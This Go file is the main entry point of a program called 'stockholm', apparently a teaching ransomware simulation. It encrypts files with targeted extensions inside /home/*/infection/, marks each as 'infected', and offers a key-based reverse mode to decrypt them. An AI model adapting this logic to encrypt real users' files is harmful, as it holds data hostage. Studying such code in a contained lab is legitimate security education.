package main

import (
	"fmt"
	"os"
	"path/filepath"

	"stockholm/crypt"
	"stockholm/internal"
	"stockholm/parse"
)

func ErrorExit(err error) {
	fmt.Println(err)
	os.Exit(1)
}

// We take all the file for the infection, they will be matched against TargetedExtensions later. For reverse, we retrieve only the .ft files
func getInfectionFiles(reverse bool) ([]string, error) {
	pattern := "/home/*/infection/*"
	if reverse {
		pattern = "/home/*/infection/*.ft"
	}
	matches, _ := filepath.Glob(pattern)
	return matches, nil
}

func reverseInfection(opts *internal.StockholmOptions) {
	files, err := getInfectionFiles(opts.Reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		err = crypt.DecryptFile(opts.Key, file)
		if err != nil {
			if !opts.Silent {
				fmt.Println(err)
			}
			continue
		}
		if !opts.Silent {
			fmt.Printf("[%s] infection reversed\n", file)
		}
	}
}

func runInfection(opts *internal.StockholmOptions) {
	files, err := getInfectionFiles(opts.Reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		ext := filepath.Ext(file)
		if internal.TargetedExtensions[ext] { 
			err = crypt.EncryptFile(opts.Key, file)
			if err != nil {
				fmt.Println(err)
				continue
			}
			if !opts.Silent {
				fmt.Printf("[%s] infected\n", file)
			}
		}
	}
}

func main() {
	opts, err := parse.Parser(os.Args)
	if err != nil {
		ErrorExit(err)
	}
	if opts.Reverse == true {
		reverseInfection(opts)
	} else {
		runInfection(opts)
	}
	os.Exit(0)
}
